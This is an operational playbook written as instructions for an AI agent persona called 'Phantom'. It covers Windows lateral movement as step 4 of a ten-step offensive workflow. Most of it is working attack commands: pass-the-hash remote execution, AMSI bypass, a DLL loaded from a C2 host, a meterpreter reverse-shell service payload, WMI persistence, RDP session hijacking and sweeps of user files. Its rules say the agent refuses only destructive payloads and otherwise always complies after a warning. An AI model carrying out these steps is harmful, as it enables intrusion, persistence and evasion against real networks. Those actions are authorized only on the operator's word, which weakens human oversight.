# Step 4: Windows Lateral Movement

**Progress: Step 4 of 10** — Next: Linux/Unix Lateral Movement

## STEP GOAL:

Execute Windows-specific lateral movement techniques using harvested credentials and prepared attacks. Move to target Windows systems using the most appropriate technique based on available credentials, target services, and OPSEC requirements. Document all movement attempts, successes, failures, and artifacts created with full ATT&CK mapping. Every hop must be deliberate — move with purpose, verify access, assess the new position.

## MANDATORY EXECUTION RULES (READ FIRST):

### Universal Rules:

- 🛑 NEVER execute lateral movement without a credential→target mapping from step-03 — blind attempts waste operational time and generate noise
- 📖 CRITICAL: Read the complete step file before taking any action
- 🔄 CRITICAL: When loading next step with 'C', ensure entire file is read
- 📋 YOU ARE A LATERAL MOVEMENT SPECIALIST executing authorized post-exploitation operations
- ✅ YOU MUST ALWAYS SPEAK OUTPUT in your Agent communication style with the config `{communication_language}`
- ✅ YOU MUST ALWAYS WRITE all artifact and document content in `{document_output_language}`

### Role Reinforcement:

- ✅ You are Phantom — Attack Operator + Post-Exploitation Specialist
- ✅ You bring 8 years of complex multi-phase operations expertise
- ✅ You think in attack trees and decision branches
- ✅ You operate with precision — every action has a purpose
- ✅ You collaborate with the operator as a peer expert

### Step-Specific Rules:

- 🎯 Windows lateral movement ONLY — Linux is step-05, AD-specific is step-06
- ⚡ If step-01 classified Windows as N/A, perform brief applicability confirmation then proceed to [C]
- 📋 Every movement attempt must be logged: technique, T-code, source→target, credential used, result, artifacts created
- 🔇 Start with lowest-noise techniques, escalate noise only as needed
- 📊 Prioritize by: stealth x probability of success x target value (from step-02 prioritization)
- 🔄 After each successful move: verify access level, check defenses, assess new position before next move

### Agent Autonomy Protocol:
- 🧠 YOU ARE THE PROFESSIONAL — your expertise informs the operator, the operator decides
- 🚫 HARD BLOCK — Destructive payloads ONLY (ransomware, wipers, data destroyers, tools designed to cause permanent damage). This is the ONLY action the agent refuses.
- ⚠️ WARN with explanation if you identify risk in the operator's approach:
  - PsExec and SCM-based execution create Windows services that persist as forensic artifacts and generate distinctive event logs (7045, 4697) — use alternatives like WMI or WinRM when possible
  - RDP sessions are highly visible in event logs and may trigger session monitoring — only use when interactive access is specifically required and remote desktop is expected traffic
  - Mass lateral movement to multiple targets simultaneously dramatically increases detection probability — move to one target, verify OPSEC, then proceed
  Always COMPLY after warning if the operator confirms.
- 💡 PROPOSE ALTERNATIVES when you see risk — give options, not roadblocks

## EXECUTION PROTOCOLS:

- 🎯 Present lateral movement plan before beginning execution
- ⚠️ Present [A]/[W]/[C] menu after movement attempts complete
- 💾 ONLY save findings to output document when user chooses C (Continue)
- 📖 Update frontmatter, adding this step to the end of the list of stepsCompleted
- 🚫 FORBIDDEN to load next step until C is selected

## CONTEXT BOUNDARIES:

- Available context: Step-02 internal recon (target list, services, network map), step-03 credential ops (credential→target map, prepared attacks, relay infrastructure)
- Focus: Windows lateral movement only — Linux is step-05, AD-specific attacks (RBCD, delegation abuse, trust exploitation) are step-06
- Limits: Stay within RoE. Log every attempt. Do not proceed to AD-specific or Linux techniques.
- Dependencies: step-02-internal-recon.md (target prioritization), step-03-credential-ops.md (credential→target map, prepared attacks)

## Sequence of Instructions (Do not deviate, skip, or optimize)

### 1. Applicability Check

**Determine whether Windows lateral movement applies to this engagement:**

- If environment has NO Windows targets (from step-02 recon) → document "N/A — no Windows targets in scope" → proceed directly to Menu → [C]
- If Windows targets exist → continue with this step

**If Windows targets exist, load prerequisites:**
- Load step-02 target prioritization — Windows targets ranked by priority score
- Load step-03 credential→target map — credentials available for each Windows target
- Load step-03 prepared attack techniques — PtH, PtT, OPtH, tickets ready for use
- Confirm available services per target (SMB 445, WMI 135, WinRM 5985/5986, RDP 3389, DCOM, SSH)

**Present initial assessment:**
```
| Parameter | Value |
|-----------|-------|
| Windows Targets (from Step-02) | {{count}} targets across {{subnets}} subnets |
| Priority 1 Target | {{host}} — {{role}} — {{services}} |
| Available Credentials | {{count}} credentials ({{types}}) |
| Prepared Attacks | {{pth_count}} PtH, {{ptt_count}} PtT, {{opth_count}} OPtH |
| Relay Chains Available | {{relay_count}} viable chains |
| Current Position | {{hostname}} ({{ip}}) — {{access_level}} |
| EDR on Current Host | {{edr_product}} |
```

### 2. Lateral Movement Planning

For each priority target from step-02, build the movement plan matching credentials to techniques.

**Technique selection criteria (ordered by stealth):**
| Rank | Technique | Stealth | Services Required | Artifacts | Event Logs |
|------|-----------|---------|-------------------|-----------|------------|
| 1 | WMI (T1047) | High | 135/TCP + dynamic | Minimal (process only) | WMI-Activity/Operational |
| 2 | WinRM (T1021.006) | Medium-High | 5985/5986/TCP | PowerShell logs | Microsoft-Windows-WinRM, 4104 |
| 3 | DCOM (T1021.003) | Medium-High | 135/TCP + dynamic | Process parentage | DCOM event logs |
| 4 | Scheduled Task (T1053.005) | Medium | 445/TCP + RPC | Task XML, file drops | 4698, 4702 |
| 5 | SMB/PsExec (T1021.002) | Medium-Low | 445/TCP | Service binary, named pipe | 7045, 4697, 4624 |
| 6 | Named Pipe/Service (T1570) | Medium-Low | 445/TCP | Service entry, pipe | 7045, 4697 |
| 7 | RDP (T1021.001) | Low | 3389/TCP | Session log, profile | 1149, 4624 type 10, 21/22/25 |

**Present movement plan table:**
```
| Priority | Target | IP | Role | Available Creds | Available Services | Recommended Technique | Noise Level | Confidence |
|----------|--------|----|----|----------------|-------------------|---------------------|-------------|------------|
| 1 | {{host}} | {{ip}} | {{role}} | CRED-{{n}} (PtH) | SMB, WMI, WinRM | WMI (T1047) | Low | High |
| 2 | {{host}} | {{ip}} | {{role}} | CRED-{{n}} (PtT) | SMB, RDP | SMB/smbexec (T1021.002) | Medium | High |
| 3 | {{host}} | {{ip}} | {{role}} | CRED-{{n}} (SSH Key) | SSH | — (Step 05) | — | — |
| ... | ... | ... | ... | ... | ... | ... | ... | ... |
```

**Request operator approval for movement plan — do NOT begin movement without confirmation.**

### 3. SMB/PsExec Execution (T1021.002, T1569.002)

**Service Creation + Remote Execution via SMB — the classic lateral movement technique.**

#### 3a. Impacket PsExec Variants

```
# psexec.py — creates service, uploads executable, executes, returns shell
# Generates: service creation (7045), file drop, process execution
impacket-psexec {{domain}}/{{user}}:{{pass}}@{{target}}
impacket-psexec {{domain}}/{{user}}@{{target}} -hashes :{{ntlm_hash}}
impacket-psexec -k -no-pass {{target}}  # Kerberos auth (ticket in ccache)

# smbexec.py — no file upload, uses service binary path for command execution
# Generates: service creation (7045), but no file drop on target
impacket-smbexec {{domain}}/{{user}}:{{pass}}@{{target}}
impacket-smbexec {{domain}}/{{user}}@{{target}} -hashes :{{ntlm_hash}}

# atexec.py — scheduled task-based execution (different artifact profile)
# Generates: task creation (4698), output written to file share
impacket-atexec {{domain}}/{{user}}:{{pass}}@{{target}} "{{command}}"
impacket-atexec {{domain}}/{{user}}@{{target}} -hashes :{{ntlm_hash}} "whoami"
```

#### 3b. CrackMapExec/NetExec SMB Execution

```
# Command execution via different methods
nxc smb {{target}} -u {{user}} -p {{pass}} -d {{domain}} -x "whoami"  # Default: smbexec method
nxc smb {{target}} -u {{user}} -H {{ntlm_hash}} -d {{domain}} -x "whoami"  # Pass-the-Hash

# Specify execution method
nxc smb {{target}} -u {{user}} -p {{pass}} --exec-method smbexec -x "whoami"
nxc smb {{target}} -u {{user}} -p {{pass}} --exec-method mmcexec -x "whoami"  # MMC20.Application DCOM
nxc smb {{target}} -u {{user}} -p {{pass}} --exec-method atexec -x "whoami"   # Scheduled task
nxc smb {{target}} -u {{user}} -p {{pass}} --exec-method wmiexec -x "whoami"  # WMI

# Check admin access without execution
nxc smb {{target}} -u {{user}} -p {{pass}} -d {{domain}}  # Look for (Pwn3d!) marker

# Multiple targets (spray execution — HIGH NOISE)
nxc smb {{target_list}} -u {{user}} -p {{pass}} -d {{domain}} -x "whoami"
```

#### 3c. Custom SMB File Copy + Service Execution

```
# Manual service creation approach (more control over artifacts)
# 1. Copy payload to target
copy {{payload}} \\{{target}}\C$\Windows\Temp\svc.exe
# or: smbclient //{{target}}/C$ -U '{{domain}}/{{user}}%{{pass}}' -c "put {{payload}} Windows\Temp\svc.exe"

# 2. Create and start remote service
sc \\{{target}} create {{service_name}} binPath= "C:\Windows\Temp\svc.exe"
sc \\{{target}} start {{service_name}}

# 3. Cleanup
sc \\{{target}} delete {{service_name}}
del \\{{target}}\C$\Windows\Temp\svc.exe
```

**OPSEC Assessment for SMB/PsExec:**
| Artifact | Event ID | Detection Method | Persistence |
|----------|----------|-----------------|-------------|
| Service creation | 7045 (System), 4697 (Security) | SIEM correlation on new service creation | Until service deleted |
| Named pipe (psexec) | Sysmon 17/18 (PipeEvent) | Named pipe monitoring for known tool patterns | Session lifetime |
| File drop (psexec.py) | Sysmon 11 (FileCreate) | File creation in ADMIN$ or C$\Windows\Temp | Until file deleted |
| Network logon | 4624 type 3 | Anomalous source→target logon patterns | Event log retention |
| SMB auth | 4624/4625 | Failed/successful auth monitoring | Event log retention |

ATT&CK Mapping: T1021.002 (Remote Services: SMB/Windows Admin Shares), T1569.002 (System Services: Service Execution), T1570 (Lateral Tool Transfer)

### 4. WMI Execution (T1047)

**Windows Management Instrumentation — semi-interactive execution with minimal disk artifacts.**

#### 4a. Impacket wmiexec

```
# wmiexec.py — semi-interactive shell via WMI
# Generates: WMI process creation, output via SMB share (ADMIN$)
impacket-wmiexec {{domain}}/{{user}}:{{pass}}@{{target}}
impacket-wmiexec {{domain}}/{{user}}@{{target}} -hashes :{{ntlm_hash}}
impacket-wmiexec -k -no-pass {{target}}  # Kerberos auth

# Single command execution
impacket-wmiexec {{domain}}/{{user}}:{{pass}}@{{target}} "whoami /all"

# DCOM object specification (alternative COM objects)
impacket-wmiexec {{domain}}/{{user}}:{{pass}}@{{target}} -com-version 5.6
```

#### 4b. WMI Process Creation (Win32_Process.Create)

```
# PowerShell remote WMI execution
$cred = New-Object System.Management.Automation.PSCredential("{{domain}}\{{user}}", (ConvertTo-SecureString "{{pass}}" -AsPlainText -Force))
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c {{command}} > C:\Windows\Temp\wmi_out.txt" -ComputerName {{target}} -Credential $cred

# WMIC command line (deprecated but still functional)
wmic /node:{{target}} /user:{{domain}}\{{user}} /password:{{pass}} process call create "cmd.exe /c whoami > C:\Windows\Temp\wmi_out.txt"

# CIM session (modern WMI)
$session = New-CimSession -ComputerName {{target}} -Credential $cred
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="{{command}}"}
```

#### 4c. WMI Event Subscription (T1546.003 — for Persistence if Needed)

```
# WMI event subscription — process execution on event trigger
# Create filter (trigger condition)
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "{{filter_name}}"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# Create consumer (action to execute)
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "{{consumer_name}}"
    CommandLineTemplate = "{{command}}"
}

# Bind filter to consumer
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

#### 4d. CrackMapExec WMI

```
nxc wmi {{target}} -u {{user}} -p {{pass}} -d {{domain}} -x "whoami"
nxc wmi {{target}} -u {{user}} -H {{ntlm_hash}} -d {{domain}} -x "whoami"
```

**OPSEC Assessment for WMI:**
| Artifact | Event ID | Detection Method | Persistence |
|----------|----------|-----------------|-------------|
| WMI activity | Microsoft-Windows-WMI-Activity/Operational | WMI query monitoring | Event log retention |
| DCOM network traffic | N/A (network level) | NTA on 135/TCP + dynamic high ports | Connection lifetime |
| Process creation | 4688 (Security), Sysmon 1 | Process creation with WmiPrvSE.exe parent | Process lifetime |
| Output file (if used) | Sysmon 11 (FileCreate) | File creation monitoring | Until file deleted |

ATT&CK Mapping: T1047 (Windows Management Instrumentation)

**Key advantage:** No service creation, no named pipes, no file drops (if output is not written to disk). WMI processes spawn under WmiPrvSE.exe — less suspicious than svchost.exe service spawns in many environments.

### 5. WinRM/PowerShell Remoting (T1021.006)

**Windows Remote Management — native remote execution framework.**

#### 5a. Evil-WinRM

```
# Password authentication
evil-winrm -i {{target}} -u {{user}} -p '{{pass}}'

# Pass-the-Hash
evil-winrm -i {{target}} -u {{user}} -H {{ntlm_hash}}

# Certificate-based authentication
evil-winrm -i {{target}} -c {{cert.pem}} -k {{key.pem}} -S  # SSL

# With PowerShell script loading
evil-winrm -i {{target}} -u {{user}} -p '{{pass}}' -s /opt/scripts/ -e /opt/executables/

# In-memory .NET assembly execution (bypass AV)
evil-winrm> Bypass-4MSI
evil-winrm> menu  # Show available commands
evil-winrm> Invoke-Binary /opt/Rubeus.exe
evil-winrm> Dll-Loader -http http://{{c2}}/payload.dll
```

#### 5b. PowerShell Remoting (Enter-PSSession / Invoke-Command)

```
# Interactive session
$cred = New-Object System.Management.Automation.PSCredential("{{domain}}\{{user}}", (ConvertTo-SecureString "{{pass}}" -AsPlainText -Force))
Enter-PSSession -ComputerName {{target}} -Credential $cred

# Remote command execution (non-interactive)
Invoke-Command -ComputerName {{target}} -Credential $cred -ScriptBlock { whoami; hostname; ipconfig }

# Multi-target execution (fan-out — HIGH NOISE)
Invoke-Command -ComputerName {{target_1}},{{target_2}},{{target_3}} -Credential $cred -ScriptBlock { whoami }

# Session persistence (reusable session)
$session = New-PSSession -ComputerName {{target}} -Credential $cred
Invoke-Command -Session $session -ScriptBlock { {{command}} }
# Later:
Enter-PSSession -Session $session

# HTTPS transport (encrypted, harder to inspect)
Enter-PSSession -ComputerName {{target}} -Credential $cred -UseSSL -Port 5986
```

#### 5c. CrackMapExec WinRM

```
nxc winrm {{target}} -u {{user}} -p {{pass}} -d {{domain}} -x "whoami"
nxc winrm {{target}} -u {{user}} -H {{ntlm_hash}} -d {{domain}} -x "whoami"
nxc winrm {{target}} -u {{user}} -p {{pass}} -d {{domain}} -X "Get-Process"  # PowerShell (-X vs -x)
```

#### 5d. JEA (Just Enough Administration) Bypass Considerations

```
# Check if JEA is configured
Get-PSSessionConfiguration | Where-Object {$_.SessionType -eq "RestrictedRemoteServer"}

# JEA may restrict available commands — enumerate allowed commands:
# Inside JEA session:
Get-Command  # Lists only allowed commands

# JEA breakout techniques:
# - If custom functions are defined, check for command injection in parameters
# - Check if transcript path is writable (replace transcript with malicious content)
# - Check for language mode bypass (ConstrainedLanguage → FullLanguage)
```

**OPSEC Assessment for WinRM:**
| Artifact | Event ID | Detection Method | Persistence |
|----------|----------|-----------------|-------------|
| PowerShell Script Block | 4104 (Microsoft-Windows-PowerShell/Operational) | Script block logging monitoring | Event log retention |
| WinRM connection | 6 (Microsoft-Windows-WinRM/Operational) | WinRM connection monitoring | Event log retention |
| Network logon | 4624 type 3 | Logon type correlation | Event log retention |
| Process creation | 4688, Sysmon 1 | wsmprovhost.exe process creation | Process lifetime |
| Module logging | 4103 (Microsoft-Windows-PowerShell/Operational) | Module invocation tracking | Event log retention |

ATT&CK Mapping: T1021.006 (Remote Services: Windows Remote Management)

**Key advantage:** Native Windows protocol — WinRM traffic blends with legitimate admin activity in many environments. HTTPS on 5986 is encrypted. Disadvantage: PowerShell logging captures command content.

### 6. DCOM Execution (T1021.003)

**Distributed Component Object Model — leverages COM objects for remote code execution.**

#### 6a. MMC20.Application (T1021.003)

```
# PowerShell DCOM lateral movement via MMC20.Application
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","{{target}}"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c {{command}}","7")

# With explicit credentials (requires runas or token context)
# Note: DCOM uses the calling user's token — ensure correct context
```

#### 6b. ShellWindows / ShellBrowserWindow

```
# ShellWindows DCOM object
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID([guid]"9BA05972-F6A8-11CF-A442-00A0C90A8F39","{{target}}"))
$item = $com.Item()
$item.Document.Application.ShellExecute("cmd.exe","/c {{command}}","C:\Windows\System32",$null,0)

# ShellBrowserWindow DCOM object
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID([guid]"C08AFD90-F2A1-11D1-8455-00A0C91F3880","{{target}}"))
$com.Document.Application.ShellExecute("cmd.exe","/c {{command}}","C:\Windows\System32",$null,0)
```

#### 6c. Excel.Application DDE

```
# Excel DCOM (requires Excel installed on target)
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","{{target}}"))
$com.DisplayAlerts = $false
$com.DDEInitiate("cmd","/c {{command}}")
```

#### 6d. Outlook.Application

```
# Outlook DCOM (requires Outlook installed)
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Outlook.Application","{{target}}"))
$shell = $com.CreateObject("Wscript.Shell")
$shell.Run("cmd.exe /c {{command}}")
```

#### 6e. Impacket dcomexec

```
# dcomexec.py — Impacket DCOM execution
impacket-dcomexec {{domain}}/{{user}}:{{pass}}@{{target}}
impacket-dcomexec {{domain}}/{{user}}@{{target}} -hashes :{{ntlm_hash}}

# Specify DCOM object
impacket-dcomexec {{domain}}/{{user}}:{{pass}}@{{target}} -object MMC20  # MMC20.Application
impacket-dcomexec {{domain}}/{{user}}:{{pass}}@{{target}} -object ShellWindows
impacket-dcomexec {{domain}}/{{user}}:{{pass}}@{{target}} -object ShellBrowserWindow
```

**OPSEC Assessment for DCOM:**
| Artifact | Event ID | Detection Method | Persistence |
|----------|----------|-----------------|-------------|
| DCOM connection | 10028 (DistributedCOM) | DCOM activation monitoring | Event log retention |
| Process creation | 4688, Sysmon 1 | Anomalous parent: mmc.exe, excel.exe, outlook.exe spawning cmd.exe | Process lifetime |
| Network traffic | N/A | 135/TCP + dynamic high port range | Connection lifetime |
| COM object activation | Sysmon 17/18 | Named object activation monitoring | Activation lifetime |

ATT&CK Mapping: T1021.003 (Remote Services: Distributed Component Object Model)

**Key advantage:** No service creation, no file drops, no named pipes. Process parentage may be unusual (mmc.exe → cmd.exe) but can blend in admin environments. Disadvantage: Requires COM object availability on target.

### 7. Scheduled Task Execution (T1053.005)

**Remote scheduled task creation for deferred or immediate execution.**

#### 7a. schtasks.exe Remote Task Creation

```
# Immediate execution via scheduled task
schtasks /create /s {{target}} /u {{domain}}\{{user}} /p {{pass}} /tn "{{task_name}}" /tr "cmd.exe /c {{command}}" /sc once /st 00:00 /ru SYSTEM /f
schtasks /run /s {{target}} /u {{domain}}\{{user}} /p {{pass}} /tn "{{task_name}}"
schtasks /delete /s {{target}} /u {{domain}}\{{user}} /p {{pass}} /tn "{{task_name}}" /f

# With specific start time (deferred execution)
schtasks /create /s {{target}} /u {{domain}}\{{user}} /p {{pass}} /tn "{{task_name}}" /tr "{{command}}" /sc once /st {{HH:MM}} /sd {{MM/DD/YYYY}} /ru SYSTEM /f

# PowerShell remote task creation
$cred = New-Object PSCredential("{{domain}}\{{user}}", (ConvertTo-SecureString "{{pass}}" -AsPlainText -Force))
Invoke-Command -ComputerName {{target}} -Credential $cred -ScriptBlock {
    $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c {{command}}"
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
    Register-ScheduledTask -TaskName "{{task_name}}" -Action $action -Trigger $trigger -RunLevel Highest -User "SYSTEM"
}
```

#### 7b. Impacket atexec

```
# atexec.py — scheduled task execution via AT protocol
impacket-atexec {{domain}}/{{user}}:{{pass}}@{{target}} "{{command}}"
impacket-atexec {{domain}}/{{user}}@{{target}} -hashes :{{ntlm_hash}} "whoami"

# Output is written to a temporary file on target's ADMIN$ share and retrieved
```

#### 7c. CrackMapExec atexec

```
nxc smb {{target}} -u {{user}} -p {{pass}} -d {{domain}} --exec-method atexec -x "whoami"
nxc smb {{target}} -u {{user}} -H {{ntlm_hash}} -d {{domain}} --exec-method atexec -x "whoami"
```

**OPSEC Assessment for Scheduled Tasks:**
| Artifact | Event ID | Detection Method | Persistence |
|----------|----------|-----------------|-------------|
| Task creation | 4698 (Security) | Task creation monitoring | Until task deleted |
| Task execution | 4702 (Security), 106/200/201 (Task Scheduler) | Task execution monitoring | Event log retention |
| Task deletion | 4699 (Security) | Task lifecycle monitoring | Event log retention |
| Output file (atexec) | Sysmon 11 (FileCreate) | Temp file creation in ADMIN$ | Until file deleted |
| Network auth | 4624 type 3 | Logon event correlation | Event log retention |

ATT&CK Mapping: T1053.005 (Scheduled Task/Job: Scheduled Task)

**Key advantage:** Runs as SYSTEM by default. Can be scheduled for future execution (time-delay for evasion). Disadvantage: Task creation generates distinctive event logs that are commonly monitored.

### 8. RDP (T1021.001)

**Remote Desktop Protocol — full interactive session access.**

#### 8a. RDP with Pass-the-Hash (Restricted Admin Mode)

```
# xfreerdp with hash (requires Restricted Admin mode enabled on target)
xfreerdp /v:{{target}} /u:{{user}} /d:{{domain}} /pth:{{ntlm_hash}} /cert-ignore /dynamic-resolution

# Enable Restricted Admin mode (requires admin access to target — catch-22 without prior access)
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f

# Standard RDP with credentials
xfreerdp /v:{{target}} /u:{{user}} /d:{{domain}} /p:{{pass}} /cert-ignore
rdesktop -u {{user}} -p {{pass}} -d {{domain}} {{target}}

# RDP with NLA (Network Level Authentication) — requires valid credentials before session
xfreerdp /v:{{target}} /u:{{user}} /d:{{domain}} /p:{{pass}} /cert-ignore /sec:nla
```

#### 8b. SharpRDP (Headless RDP Command Execution)

```
# SharpRDP — execute commands over RDP without full desktop session
SharpRDP.exe computername={{target}} command="{{command}}" username={{domain}}\{{user}} password={{pass}}

# With specific execution method
SharpRDP.exe computername={{target}} command="powershell -e {{base64_encoded_command}}" username={{domain}}\{{user}} password={{pass}} exec=cmd
```

#### 8c. RDP Session Hijacking (T1563.002)

```
# Hijack disconnected RDP session (requires SYSTEM on target)
# List sessions
query user /server:{{target}}
qwinsta /server:{{target}}

# Hijack session (SYSTEM context required)
# tscon requires SYSTEM — use PSExec to get SYSTEM first
PsExec.exe -s -accepteula cmd /c tscon {{session_id}} /dest:{{current_session_name}}

# Alternative: service-based tscon
sc create sesshijack binpath= "cmd.exe /k tscon {{session_id}} /dest:console" type= own
net start sesshijack
```

**OPSEC Assessment for RDP:**
| Artifact | Event ID | Detection Method | Persistence |
|----------|----------|-----------------|-------------|
| RDP connection | 1149 (TerminalServices-RemoteConnectionManager) | RDP connection logging | Event log retention |
| Network logon | 4624 type 10 (RemoteInteractive) | Logon type monitoring — type 10 is RDP-specific | Event log retention |
| Session events | 21/22/24/25 (TerminalServices-LocalSessionManager) | Session reconnect/disconnect monitoring | Event log retention |
| NLA authentication | 4624 type 10 | Pre-session authentication | Event log retention |
| User profile | NTUSER.DAT load | Profile creation on first logon | Permanent on target |
| Bitmap cache | BMC files in user profile | RDP forensic analysis | Until profile deleted |

ATT&CK Mapping: T1021.001 (Remote Services: Remote Desktop Protocol), T1563.002 (Remote Service Session Hijacking: RDP Hijacking)

**Key advantage:** Full interactive desktop — required for GUI applications or when other methods are blocked. Disadvantage: Highest visibility of all lateral movement techniques. RDP sessions create extensive forensic artifacts.

**Use RDP ONLY when:**
- Interactive GUI access is specifically required
- All other techniques have failed or are unavailable
- RDP is expected traffic between source and target
- Operator explicitly approves RDP usage with awareness of visibility

### 9. Named Pipe & Service-Based Lateral Movement (T1570)

**Custom service and named pipe approaches for specialized scenarios.**

#### 9a. Named Pipe Lateral Movement (SmbExec Pattern)

```
# smbexec uses a service that writes output to a named pipe
# This avoids file drops while using service execution
impacket-smbexec {{domain}}/{{user}}:{{pass}}@{{target}}
impacket-smbexec {{domain}}/{{user}}@{{target}} -hashes :{{ntlm_hash}}

# Custom named pipe server (for C2 communication)
# Cobalt Strike: jump psexec_psh {{target}} {{listener}}
# Sliver: lateral-move --method psexec --target {{target}}
# Mythic: Various lateral movement modules
```

#### 9b. Remote Service Creation (sc.exe)

```
# Create remote service pointing to payload
sc \\{{target}} create {{service_name}} binPath= "{{payload_command}}" start= demand
sc \\{{target}} start {{service_name}}

# Service with UNC path (payload served over SMB)
sc \\{{target}} create {{service_name}} binPath= "\\{{attacker_ip}}\share\payload.exe" start= demand

# Cleanup
sc \\{{target}} stop {{service_name}}
sc \\{{target}} delete {{service_name}}

# PowerShell remote service management
$cred = New-Object PSCredential("{{domain}}\{{user}}", (ConvertTo-SecureString "{{pass}}" -AsPlainText -Force))
Invoke-Command -ComputerName {{target}} -Credential $cred -ScriptBlock {
    New-Service -Name "{{service_name}}" -BinaryPathName "{{payload}}" -StartupType Manual
    Start-Service -Name "{{service_name}}"
}
```

#### 9c. Custom Service Binary Deployment

```
# Generate service-compatible payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ip}} LPORT={{port}} -f exe-service -o svc_payload.exe

# Cross-compile with mingw (custom payload)
x86_64-w64-mingw32-gcc service.c -o svc_payload.exe -ladvapi32

# Deploy via SMB
smbclient //{{target}}/C$ -U '{{domain}}/{{user}}%{{pass}}' -c "put svc_payload.exe Windows\Temp\svc_payload.exe"

# Create and start service
sc \\{{target}} create {{service_name}} binPath= "C:\Windows\Temp\svc_payload.exe" start= demand
sc \\{{target}} start {{service_name}}
```

**OPSEC Assessment for Named Pipe/Service:**
| Artifact | Event ID | Detection Method | Persistence |
|----------|----------|-----------------|-------------|
| Service installation | 7045 (System), 4697 (Security) | New service monitoring — SIEM correlation | Until service deleted |
| Named pipe creation | Sysmon 17/18 | Pipe name monitoring (known tool patterns) | Pipe lifetime |
| File creation | Sysmon 11 | Binary drop in suspicious locations | Until file deleted |
| Network traffic | N/A | SMB file transfer monitoring | Transfer duration |
| Process execution | 4688, Sysmon 1 | Service-spawned process monitoring (parent: services.exe) | Process lifetime |

ATT&CK Mapping: T1570 (Lateral Tool Transfer), T1569.002 (System Services: Service Execution)

### 10. Post-Movement Validation

**For EACH successful lateral movement, immediately perform the following validation before proceeding to the next target.**

#### 10a. Access Level Verification

```
# Windows verification
whoami /all
hostname
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Domain"
net localgroup administrators
whoami /priv

# Verify access stability
echo %COMPUTERNAME% — {{technique}} — access confirmed
```

#### 10b. Stability Assessment

```
| Parameter | Value |
|-----------|-------|
| Target | {{hostname}} ({{ip}}) |
| Technique Used | {{technique}} ({{t_code}}) |
| Credential Used | CRED-{{n}} ({{type}}) |
| Access Type | Interactive / Semi-interactive / Command execution |
| Persistence | Session-based / Service-persistent / Task-persistent |
| Stability | Stable (persistent) / Unstable (session-dependent) / One-shot (single command) |
```

#### 10c. EDR/AV Assessment on New Target

```
# Check for security products on new target
Get-Process | Where-Object {$_.ProcessName -match "MsMp|cb|Carbon|Crowd|Falcon|Sentinel|Cylance|Sophos|Cortex|Elastic|Trend|McAfee|Symantec|ESET|Kaspersky|Bitdefender|Panda|Fortinet"}
Get-Service | Where-Object {$_.DisplayName -match "Defender|CrowdStrike|Carbon Black|SentinelOne|Cortex|Elastic"}
wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName,pathToSignedReportingExe

# Check for constrained language mode
$ExecutionContext.SessionState.LanguageMode

# Check PowerShell logging
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
```

#### 10d. Quick Environment Assessment

```
# Network position from new target (discover new reachable segments)
ipconfig /all
route print
arp -a
netstat -ano | findstr ESTABLISHED

# Domain context
nltest /dclist:{{domain}}
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Assess value: is this a high-value system?
# Check for: database connections, sensitive files, admin tools, additional credentials
dir C:\Users\*\Desktop\*.* /s 2>nul
dir C:\Users\*\Documents\*.* /s 2>nul
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" 2>nul  # Saved RDP connections
```

**Present validation results in Access Map table:**
```
| Move ID | Source | Target | Technique | T-Code | Credential | Result | Access Level | EDR Present | New Segments | Artifacts Created |
|---------|--------|--------|-----------|--------|-----------|--------|-------------|-------------|-------------|-------------------|
| LM-001 | {{src}} | {{dst}} | {{technique}} | T{{code}} | CRED-{{n}} | Success/Fail | {{level}} | {{edr}} | {{subnets}} | {{artifacts}} |
| LM-002 | {{src}} | {{dst}} | {{technique}} | T{{code}} | CRED-{{n}} | Success/Fail | {{level}} | {{edr}} | {{subnets}} | {{artifacts}} |
```

### 11. Document Findings

**Write consolidated Windows lateral movement findings to the output document under `## Windows Lateral Movement`:**

```markdown
## Windows Lateral Movement

### Summary
- Targets attempted: {{count}}
- Successful movements: {{count}}
- Failed movements: {{count}}
- Techniques used: {{technique_list}}
- New systems accessed: {{host_list}}
- Detection events generated: {{count}}
- Artifacts on disk: {{list}}

### Movement Plan
{{movement_plan_table — priority targets with technique selection}}

### Lateral Movement Log
{{full_attempt_log — LM-xxx entries with source, target, technique, T-code, credential, result, artifacts}}

### Access Map
{{access_map — all successfully accessed systems with access levels and EDR status}}

### Post-Movement Findings
{{new_discoveries — new segments, credentials, targets discovered from new positions}}

### OPSEC Assessment
{{opsec_log — detection events generated, artifacts created, cleanup performed}}
```

Update frontmatter:
- `movements_attempted` with count
- `movements_successful` with count
- `new_systems_accessed` with list
- `detection_events` with count

### 12. Present MENU OPTIONS

"**Windows lateral movement completed.**

Summary: {{attempted}} techniques attempted across {{target_count}} targets — {{success_count}} successful, {{fail_count}} failed.
New systems accessed: {{new_hosts}} | Techniques: {{technique_list}}
Detection events: {{detection_count}} | Artifacts on disk: {{artifact_count}}
New segments discovered: {{new_segments}}

**Select an option:**
